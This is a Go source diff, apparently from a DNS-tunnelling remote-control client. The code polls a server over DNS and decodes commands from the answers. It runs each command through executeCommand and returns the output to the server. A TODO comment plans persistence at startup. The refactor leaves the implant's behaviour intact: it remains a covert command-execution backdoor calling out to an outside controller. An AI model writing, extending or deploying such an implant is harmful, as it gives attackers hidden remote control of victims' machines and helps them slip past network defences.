@@ -11,12 +11,12 @@ import (
 const sleepIdleTime = 60
 const interactiveIdleTime = 5
 
-type answerType string
+type messageType string
 
 const (
-	POLL   answerType = "poll"
-	ANSWER answerType = "answer"
-	ERROR  answerType = "error"
+	POLL   messageType = "poll"
+	ANSWER messageType = "answer"
+	ERROR  messageType = "error"
 )
 
 type DNSClient struct {
@@ -48,9 +48,8 @@ func (d DNSClient) poll() {
 	d.sendMessage(POLL, "poll")
 }
 
-func (d DNSClient) sendMessage(commandType answerType, message string) {
+func (d DNSClient) sendMessage(commandType messageType, message string) {
 	m := d.createMessage(commandType, message)
-
 	in, _, err := d.client.Exchange(m, d.address)
 	if err != nil {
 		fmt.Println(err)
@@ -60,7 +59,7 @@ func (d DNSClient) sendMessage(commandType answerType, message string) {
 	d.handleAnswer(in)
 }
 
-func (d DNSClient) createMessage(commandType answerType, message string) *dns.Msg {
+func (d DNSClient) createMessage(commandType messageType, message string) *dns.Msg {
 	m := new(dns.Msg)
 	m.SetQuestion(dns.Fqdn(string(commandType)), dns.TypeA)
 	m.Extra = d.messageSplitter.Split(d.encoder.Encode(message))
@@ -71,13 +70,20 @@ func (d DNSClient) handleAnswer(answerMsg *dns.Msg) {
 	collect := d.messageSplitter.Collect(answerMsg.Answer)
 	decoded := d.encoder.Decode(collect)
 	fmt.Println(decoded)
-	if decoded == "idle" {
+	d.handleDecodedCommand(decoded)
+}
+
+// todo: add exit and quit command
+// todo: add persistent startup command
+func (d DNSClient) handleDecodedCommand(decoded string) {
+	switch decoded {
+	case "idle":
 		d.idleCounter++
-		return
-	} else if decoded == "ok" {
+		break
+	case "ok":
 		d.idleCounter = 0
-		return
-	} else {
+		break
+	default:
 		d.idleCounter = 0
 		output := executeCommand(decoded)
 		d.sendMessage(ANSWER, output)
